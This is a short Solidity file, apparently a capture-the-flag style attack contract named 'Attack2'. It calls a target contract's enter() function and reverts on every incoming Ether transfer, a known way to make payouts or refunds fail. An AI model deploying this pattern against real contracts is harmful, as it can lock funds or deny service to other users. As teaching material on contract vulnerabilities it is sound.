pragma solidity ^0.8.0;

interface IGt {
    function enter() external;
}

contract Attack2 {
    IGt public immutable target;

    constructor (address payable _target) {
        target = IGt(_target);
    }

    function callEnter() public {
        target.enter();
    }

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }
}